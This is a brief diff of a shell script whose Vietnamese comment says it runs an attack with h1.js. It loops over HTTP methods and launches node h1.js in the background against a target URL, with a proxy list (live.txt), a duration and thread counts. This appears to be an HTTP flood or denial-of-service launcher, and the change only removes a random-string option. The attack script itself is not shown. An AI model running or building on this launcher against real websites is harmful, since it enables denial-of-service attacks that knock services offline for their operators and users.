@@ -31,7 +31,7 @@ wait
 
 # Chạy tấn công với h1.js
 for method in GET; do 
-  node h1.js "$method" "$URL" live.txt "$TIME" 1 1 randomstring=true &
+  node h1.js "$method" "$URL" live.txt "$TIME" 1 1 &
 done
 
 
